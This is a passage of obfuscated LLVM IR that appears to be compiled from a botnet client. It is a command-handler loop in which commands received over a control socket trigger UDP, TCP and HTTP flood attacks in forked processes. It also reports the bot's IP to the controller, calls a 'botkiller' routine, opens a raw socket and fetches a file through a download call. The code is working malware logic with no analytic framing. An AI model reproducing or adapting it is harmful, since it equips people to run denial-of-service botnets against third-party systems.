  %204 = call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0)) #10
  %205 = icmp ne i32 %204, 0
  %206 = select i1 %205, i32 -123850938, i32 1794957148
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = call i32 @listFork()
  %209 = icmp ne i32 %208, 0
  %210 = select i1 %209, i32 -1904030887, i32 -166410201
  store i32 %210, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* @mainCommSock, align 4
  %213 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %214 = call i8* @inet_ntoa(i32 %213) #2
  %215 = call i32 (i32, i8*, ...) @sockprintf(i32 %212, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.452, i32 0, i32 0), i8* %214)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:216:                                    ; preds = %loopEntry
  store i32 -123850938, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 0
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @strcmp(i8* %220, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.453, i32 0, i32 0)) #10
  %222 = icmp ne i32 %221, 0
  %223 = select i1 %222, i32 -936650549, i32 268955490
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* @mainCommSock, align 4
  %226 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %227 = call i8* @inet_ntoa(i32 %226) #2
  %228 = call i32 (i32, i8*, ...) @sockprintf(i32 %225, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.454, i32 0, i32 0), i8* %227)
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 0
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @strcmp(i8* %232, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.455, i32 0, i32 0)) #10
  %234 = icmp ne i32 %233, 0
  %235 = select i1 %234, i32 1713547901, i32 74315876
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32, i32* %3, align 4
  %238 = icmp slt i32 %237, 6
  %239 = select i1 %238, i32 -249024527, i32 -1650102782
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i8**, i8*** %4, align 8
  %242 = getelementptr inbounds i8*, i8** %241, i64 3
  %243 = load i8*, i8** %242, align 8
  %244 = call i32 @atoi(i8* %243) #10
  %245 = icmp eq i32 %244, -1
  %246 = select i1 %245, i32 -249024527, i32 -559444423
  store i32 %246, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 2
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #10
  %252 = icmp eq i32 %251, -1
  %253 = select i1 %252, i32 -249024527, i32 -874783574
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8**, i8*** %4, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 4
  %257 = load i8*, i8** %256, align 8
  %258 = call i32 @atoi(i8* %257) #10
  %259 = icmp eq i32 %258, -1
  %260 = select i1 %259, i32 -249024527, i32 -1746957209
  store i32 %260, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 5
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #10
  %266 = icmp eq i32 %265, -1
  %267 = select i1 %266, i32 -249024527, i32 1460639586
  store i32 %267, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i8**, i8*** %4, align 8
  %270 = getelementptr inbounds i8*, i8** %269, i64 5
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 @atoi(i8* %271) #10
  %273 = icmp sgt i32 %272, 65536
  %274 = select i1 %273, i32 -249024527, i32 1809481823
  store i32 %274, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 5
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 @atoi(i8* %278) #10
  %280 = icmp sgt i32 %279, 65500
  %281 = select i1 %280, i32 -249024527, i32 694850724
  store i32 %281, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 4
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @atoi(i8* %285) #10
  %287 = icmp sgt i32 %286, 32
  %288 = select i1 %287, i32 -249024527, i32 -471505062
  store i32 %288, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %3, align 4
  %291 = icmp eq i32 %290, 7
  %292 = select i1 %291, i32 2027474480, i32 -425862691
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 6
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @atoi(i8* %296) #10
  %298 = icmp slt i32 %297, 1
  %299 = select i1 %298, i32 -249024527, i32 -425862691
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i32, i32* @mainCommSock, align 4
  %302 = call i32 (i32, i8*, ...) @sockprintf(i32 %301, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 1
  %306 = load i8*, i8** %305, align 8
  store i8* %306, i8** %10, align 8
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 2
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #10
  store i32 %310, i32* %11, align 4
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 3
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #10
  store i32 %314, i32* %12, align 4
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 4
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #10
  store i32 %318, i32* %13, align 4
  %319 = load i8**, i8*** %4, align 8
  %320 = getelementptr inbounds i8*, i8** %319, i64 5
  %321 = load i8*, i8** %320, align 8
  %322 = call i32 @atoi(i8* %321) #10
  store i32 %322, i32* %14, align 4
  %323 = load i32, i32* %3, align 4
  %324 = icmp sgt i32 %323, 6
  %325 = select i1 %324, i32 983903482, i32 -216861433
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = load i8**, i8*** %4, align 8
  %328 = getelementptr inbounds i8*, i8** %327, i64 6
  %329 = load i8*, i8** %328, align 8
  %330 = call i32 @atoi(i8* %329) #10
  store i32 822933115, i32* %switchVar
  store i32 %330, i32* %.reg2mem9
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  store i32 822933115, i32* %switchVar
  store i32 1000, i32* %.reg2mem9
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %.reload10 = load i32, i32* %.reg2mem9
  store i32 %.reload10, i32* %15, align 4
  %333 = load i32, i32* %3, align 4
  %334 = icmp sgt i32 %333, 7
  %335 = select i1 %334, i32 -968719489, i32 473916723
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i8**, i8*** %4, align 8
  %338 = getelementptr inbounds i8*, i8** %337, i64 7
  %339 = load i8*, i8** %338, align 8
  %340 = call i32 @atoi(i8* %339) #10
  store i32 -994510892, i32* %switchVar
  store i32 %340, i32* %.reg2mem11
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 -994510892, i32* %switchVar
  store i32 1000000, i32* %.reg2mem11
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %.reload12 = load i32, i32* %.reg2mem11
  store i32 %.reload12, i32* %16, align 4
  %343 = load i32, i32* %3, align 4
  %344 = icmp sgt i32 %343, 8
  %345 = select i1 %344, i32 -1754166013, i32 -609877545
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 8
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @atoi(i8* %349) #10
  store i32 1745252708, i32* %switchVar
  store i32 %350, i32* %.reg2mem13
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  store i32 1745252708, i32* %switchVar
  store i32 0, i32* %.reg2mem13
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %.reload14 = load i32, i32* %.reg2mem13
  store i32 %.reload14, i32* %17, align 4
  %353 = load i8*, i8** %10, align 8
  %354 = call i8* @strstr(i8* %353, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %355 = icmp ne i8* %354, null
  %356 = select i1 %355, i32 -335869723, i32 69619235
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i8*, i8** %10, align 8
  %359 = call i8* @strtok(i8* %358, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %359, i8** %18, align 8
  store i32 1432007156, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i8*, i8** %18, align 8
  %362 = icmp ne i8* %361, null
  %363 = select i1 %362, i32 -1914577491, i32 -612550766
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = call i32 @listFork()
  %366 = icmp ne i32 %365, 0
  %367 = select i1 %366, i32 -333807070, i32 1907187364
  store i32 %367, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i8*, i8** %18, align 8
  %370 = load i32, i32* %11, align 4
  %371 = load i32, i32* %12, align 4
  %372 = load i32, i32* %13, align 4
  %373 = load i32, i32* %14, align 4
  %374 = load i32, i32* %15, align 4
  %375 = load i32, i32* %16, align 4
  %376 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %369, i32 %370, i32 %371, i32 %372, i32 %373, i32 %374, i32 %375, i32 %376)
  call void @_exit(i32 0) #12
  unreachable

; <label>:377:                                    ; preds = %loopEntry
  %378 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %378, i8** %18, align 8
  store i32 1432007156, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  store i32 -28750946, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = call i32 @listFork()
  %382 = icmp ne i32 %381, 0
  %383 = select i1 %382, i32 326460809, i32 776449168
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i8*, i8** %10, align 8
  %386 = load i32, i32* %11, align 4
  %387 = load i32, i32* %12, align 4
  %388 = load i32, i32* %13, align 4
  %389 = load i32, i32* %14, align 4
  %390 = load i32, i32* %15, align 4
  %391 = load i32, i32* %16, align 4
  %392 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %385, i32 %386, i32 %387, i32 %388, i32 %389, i32 %390, i32 %391, i32 %392)
  call void @_exit(i32 0) #12
  unreachable

; <label>:393:                                    ; preds = %loopEntry
  store i32 -28750946, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  %396 = load i8**, i8*** %4, align 8
  %397 = getelementptr inbounds i8*, i8** %396, i64 0
  %398 = load i8*, i8** %397, align 8
  %399 = call i32 @strcmp(i8* %398, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.457, i32 0, i32 0)) #10
  %400 = icmp ne i32 %399, 0
  %401 = select i1 %400, i32 -2119052370, i32 -1710772176
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i32, i32* %3, align 4
  %404 = icmp slt i32 %403, 6
  %405 = select i1 %404, i32 1171264228, i32 -1976480182
  store i32 %405, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 3
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #10
  %411 = icmp eq i32 %410, -1
  %412 = select i1 %411, i32 1171264228, i32 906404493
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load i8**, i8*** %4, align 8
  %415 = getelementptr inbounds i8*, i8** %414, i64 2
  %416 = load i8*, i8** %415, align 8
  %417 = call i32 @atoi(i8* %416) #10
  %418 = icmp eq i32 %417, -1
  %419 = select i1 %418, i32 1171264228, i32 -1359284251
  store i32 %419, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 4
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #10
  %425 = icmp eq i32 %424, -1
  %426 = select i1 %425, i32 1171264228, i32 2055231367
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 4
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* %430) #10
  %432 = icmp sgt i32 %431, 32
  %433 = select i1 %432, i32 1171264228, i32 1696214912
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i32, i32* %3, align 4
  %436 = icmp sgt i32 %435, 6
  %437 = select i1 %436, i32 -481583359, i32 1662610630
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 6
  %441 = load i8*, i8** %440, align 8
  %442 = call i32 @atoi(i8* %441) #10
  %443 = icmp slt i32 %442, 0
  %444 = select i1 %443, i32 1171264228, i32 1662610630
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i32, i32* %3, align 4
  %447 = icmp eq i32 %446, 8
  %448 = select i1 %447, i32 -401114714, i32 -167071104
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i8**, i8*** %4, align 8
  %451 = getelementptr inbounds i8*, i8** %450, i64 7
  %452 = load i8*, i8** %451, align 8
  %453 = call i32 @atoi(i8* %452) #10
  %454 = icmp slt i32 %453, 1
  %455 = select i1 %454, i32 1171264228, i32 -167071104
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i32, i32* @mainCommSock, align 4
  %458 = call i32 (i32, i8*, ...) @sockprintf(i32 %457, i8* getelementptr inbounds ([186 x i8], [186 x i8]* @.str.458, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i8**, i8*** %4, align 8
  %461 = getelementptr inbounds i8*, i8** %460, i64 1
  %462 = load i8*, i8** %461, align 8
  store i8* %462, i8** %19, align 8
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #10
  store i32 %466, i32* %20, align 4
  %467 = load i8**, i8*** %4, align 8
  %468 = getelementptr inbounds i8*, i8** %467, i64 3
  %469 = load i8*, i8** %468, align 8
  %470 = call i32 @atoi(i8* %469) #10
  store i32 %470, i32* %21, align 4
  %471 = load i8**, i8*** %4, align 8
  %472 = getelementptr inbounds i8*, i8** %471, i64 4
  %473 = load i8*, i8** %472, align 8
  %474 = call i32 @atoi(i8* %473) #10
  store i32 %474, i32* %22, align 4
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 5
  %477 = load i8*, i8** %476, align 8
  store i8* %477, i8** %23, align 8
  %478 = load i32, i32* %3, align 4
  %479 = icmp eq i32 %478, 8
  %480 = select i1 %479, i32 1312545015, i32 1494039912
  store i32 %480, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = load i8**, i8*** %4, align 8
  %483 = getelementptr inbounds i8*, i8** %482, i64 7
  %484 = load i8*, i8** %483, align 8
  %485 = call i32 @atoi(i8* %484) #10
  store i32 1545747032, i32* %switchVar
  store i32 %485, i32* %.reg2mem15
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  store i32 1545747032, i32* %switchVar
  store i32 10, i32* %.reg2mem15
  br label %loopEnd

; <label>:487:                                    ; preds = %loopEntry
  %.reload16 = load i32, i32* %.reg2mem15
  store i32 %.reload16, i32* %24, align 4
  %488 = load i32, i32* %3, align 4
  %489 = icmp sgt i32 %488, 6
  %490 = select i1 %489, i32 671007060, i32 1633965332
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i8**, i8*** %4, align 8
  %493 = getelementptr inbounds i8*, i8** %492, i64 6
  %494 = load i8*, i8** %493, align 8
  %495 = call i32 @atoi(i8* %494) #10
  store i32 2021057126, i32* %switchVar
  store i32 %495, i32* %.reg2mem17
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 2021057126, i32* %switchVar
  store i32 0, i32* %.reg2mem17
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %.reload18 = load i32, i32* %.reg2mem17
  store i32 %.reload18, i32* %25, align 4
  %498 = load i8*, i8** %19, align 8
  %499 = call i8* @strstr(i8* %498, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %500 = icmp ne i8* %499, null
  %501 = select i1 %500, i32 -1454554768, i32 1340996880
  store i32 %501, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %503 = load i8*, i8** %19, align 8
  %504 = call i8* @strtok(i8* %503, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %504, i8** %26, align 8
  store i32 133471522, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i8*, i8** %26, align 8
  %507 = icmp ne i8* %506, null
  %508 = select i1 %507, i32 -897949718, i32 -1479706678
  store i32 %508, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = call i32 @listFork()
  %511 = icmp ne i32 %510, 0
  %512 = select i1 %511, i32 -1722366503, i32 893872456
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i8*, i8** %26, align 8
  %515 = load i32, i32* %20, align 4
  %516 = load i32, i32* %21, align 4
  %517 = load i32, i32* %22, align 4
  %518 = load i8*, i8** %23, align 8
  %519 = load i32, i32* %25, align 4
  %520 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %514, i32 %515, i32 %516, i32 %517, i8* %518, i32 %519, i32 %520)
  call void @_exit(i32 0) #12
  unreachable

; <label>:521:                                    ; preds = %loopEntry
  %522 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %522, i8** %26, align 8
  store i32 133471522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  store i32 2132777573, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  %525 = call i32 @listFork()
  %526 = icmp ne i32 %525, 0
  %527 = select i1 %526, i32 1391127192, i32 -1614014499
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load i8*, i8** %19, align 8
  %530 = load i32, i32* %20, align 4
  %531 = load i32, i32* %21, align 4
  %532 = load i32, i32* %22, align 4
  %533 = load i8*, i8** %23, align 8
  %534 = load i32, i32* %25, align 4
  %535 = load i32, i32* %24, align 4
  call void @sendTCP(i8* %529, i32 %530, i32 %531, i32 %532, i8* %533, i32 %534, i32 %535)
  call void @_exit(i32 0) #12
  unreachable

; <label>:536:                                    ; preds = %loopEntry
  store i32 2132777573, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  store i32 -2119052370, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i8**, i8*** %4, align 8
  %540 = getelementptr inbounds i8*, i8** %539, i64 0
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @strcmp(i8* %541, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0)) #10
  %543 = icmp ne i32 %542, 0
  %544 = select i1 %543, i32 1906897545, i32 -974771778
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i32, i32* %3, align 4
  %547 = icmp slt i32 %546, 6
  %548 = select i1 %547, i32 1475380763, i32 -1603486522
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i32, i32* @mainCommSock, align 4
  %551 = call i32 (i32, i8*, ...) @sockprintf(i32 %550, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.460, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  %553 = load i8**, i8*** %4, align 8
  %554 = getelementptr inbounds i8*, i8** %553, i64 1
  %555 = load i8*, i8** %554, align 8
  %556 = call i8* @strstr(i8* %555, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %557 = icmp ne i8* %556, null
  %558 = select i1 %557, i32 1229582082, i32 441963021
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i8**, i8*** %4, align 8
  %561 = getelementptr inbounds i8*, i8** %560, i64 1
  %562 = load i8*, i8** %561, align 8
  %563 = call i8* @strtok(i8* %562, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %563, i8** %27, align 8
  store i32 620267089, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = load i8*, i8** %27, align 8
  %566 = icmp ne i8* %565, null
  %567 = select i1 %566, i32 -158227223, i32 1955451681
  store i32 %567, i32* %switchVar
  br label %loopEnd

; <label>:568:                                    ; preds = %loopEntry
  %569 = call i32 @listFork()
  %570 = icmp ne i32 %569, 0
  %571 = select i1 %570, i32 -287852226, i32 -1815584305
  store i32 %571, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i8**, i8*** %4, align 8
  %574 = getelementptr inbounds i8*, i8** %573, i64 1
  %575 = load i8*, i8** %574, align 8
  %576 = load i8**, i8*** %4, align 8
  %577 = getelementptr inbounds i8*, i8** %576, i64 2
  %578 = load i8*, i8** %577, align 8
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 3
  %581 = load i8*, i8** %580, align 8
  %582 = call i32 @atoi(i8* %581) #10
  %583 = trunc i32 %582 to i16
  %584 = load i8**, i8*** %4, align 8
  %585 = getelementptr inbounds i8*, i8** %584, i64 4
  %586 = load i8*, i8** %585, align 8
  %587 = load i8**, i8*** %4, align 8
  %588 = getelementptr inbounds i8*, i8** %587, i64 5
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @atoi(i8* %589) #10
  %591 = load i8**, i8*** %4, align 8
  %592 = getelementptr inbounds i8*, i8** %591, i64 6
  %593 = load i8*, i8** %592, align 8
  %594 = call i32 @atoi(i8* %593) #10
  call void @sendHTTP(i8* %575, i8* %578, i16 zeroext %583, i8* %586, i32 %590, i32 %594)
  call void @_exit(i32 0) #12
  unreachable

; <label>:595:                                    ; preds = %loopEntry
  %596 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %596, i8** %27, align 8
  store i32 620267089, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  store i32 1046241598, i32* %switchVar
  br label %loopEnd

; <label>:598:                                    ; preds = %loopEntry
  %599 = call i32 @listFork()
  %600 = icmp ne i32 %599, 0
  %601 = select i1 %600, i32 -841844833, i32 211932933
  store i32 %601, i32* %switchVar
  br label %loopEnd

; <label>:602:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:603:                                    ; preds = %loopEntry
  %604 = load i8**, i8*** %4, align 8
  %605 = getelementptr inbounds i8*, i8** %604, i64 1
  %606 = load i8*, i8** %605, align 8
  %607 = load i8**, i8*** %4, align 8
  %608 = getelementptr inbounds i8*, i8** %607, i64 2
  %609 = load i8*, i8** %608, align 8
  %610 = load i8**, i8*** %4, align 8
  %611 = getelementptr inbounds i8*, i8** %610, i64 3
  %612 = load i8*, i8** %611, align 8
  %613 = call i32 @atoi(i8* %612) #10
  %614 = trunc i32 %613 to i16
  %615 = load i8**, i8*** %4, align 8
  %616 = getelementptr inbounds i8*, i8** %615, i64 4
  %617 = load i8*, i8** %616, align 8
  %618 = load i8**, i8*** %4, align 8
  %619 = getelementptr inbounds i8*, i8** %618, i64 5
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 @atoi(i8* %620) #10
  %622 = load i8**, i8*** %4, align 8
  %623 = getelementptr inbounds i8*, i8** %622, i64 6
  %624 = load i8*, i8** %623, align 8
  %625 = call i32 @atoi(i8* %624) #10
  call void @sendHTTP(i8* %606, i8* %609, i16 zeroext %614, i8* %617, i32 %621, i32 %625)
  call void @_exit(i32 0) #12
  unreachable

; <label>:626:                                    ; preds = %loopEntry
  store i32 1906897545, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = load i8**, i8*** %4, align 8
  %629 = getelementptr inbounds i8*, i8** %628, i64 0
  %630 = load i8*, i8** %629, align 8
  %631 = call i32 @strcmp(i8* %630, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i32 0, i32 0)) #10
  %632 = icmp ne i32 %631, 0
  %633 = select i1 %632, i32 541601170, i32 723115762
  store i32 %633, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %635, i32* %28, align 4
  %636 = icmp slt i32 %635, 0
  %637 = select i1 %636, i32 4808569, i32 650876716
  store i32 %637, i32* %switchVar
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  call void @exit(i32 1) #14
  unreachable

; <label>:639:                                    ; preds = %loopEntry
  %640 = load i32, i32* %3, align 4
  %641 = icmp slt i32 %640, 6
  %642 = select i1 %641, i32 -1647197704, i32 -37334669
  store i32 %642, i32* %switchVar
  br label %loopEnd

; <label>:643:                                    ; preds = %loopEntry
  %644 = load i32, i32* @mainCommSock, align 4
  %645 = call i32 (i32, i8*, ...) @sockprintf(i32 %644, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.462, i32 0, i32 0))
  call void @exit(i32 0) #14
  unreachable

; <label>:646:                                    ; preds = %loopEntry
  %647 = call i32 @listFork()
  %648 = icmp ne i32 %647, 0
  %649 = select i1 %648, i32 -1161875899, i32 1658667709
  store i32 %649, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = call i64 @time(i64* null) #2
  %652 = trunc i64 %651 to i32
  call void @srand(i32 %652) #2
  %653 = load i8**, i8*** %4, align 8
  %654 = getelementptr inbounds i8*, i8** %653, i64 4
  %655 = load i8*, i8** %654, align 8
  %656 = call i32 @atoi(i8* %655) #10
  store i32 %656, i32* %29, align 4
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 5
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @atoi(i8* %659) #10
  store i32 %660, i32* %30, align 4
  store i32 0, i32* %32, align 4
  %661 = load i8**, i8*** %4, align 8
  %662 = getelementptr inbounds i8*, i8** %661, i64 3
  %663 = load i8*, i8** %662, align 8
  %664 = call i32 @download(i8* %663, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0))
  %665 = load i32, i32* @mainCommSock, align 4
